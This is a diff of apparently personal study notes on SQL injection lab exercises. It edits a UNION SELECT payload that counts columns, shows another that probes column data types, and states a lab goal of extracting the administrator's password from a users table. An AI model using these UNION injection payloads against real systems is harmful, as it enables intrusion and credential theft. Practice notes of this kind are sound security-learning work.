@@ -149,7 +149,7 @@ PRINT THIS 'LJXwKG' USING UNION
 
 
       -fIND THE NO. OF COLUMNS 
-      'UNION SELECT NULL,NULL,NULL,NULL --+
+      'UNION SELECT NULL,NULL,NULL --+
 
       -FIND THE DATA TYPE OF COLUMNS
       'UNION SELECT NULL,'LJXwKG',NULL --+
@@ -159,4 +159,4 @@ ________________________________________________________________________________
 SQL9: injection UNION attack, retrieving data from other tables
 
 GIVEN : The database contains a different table called users.
-        columns called username and password. FIND THE PASSWORD OF administrator 
+        columns called username and password. FIND THE PASSWORD OF administrator. 
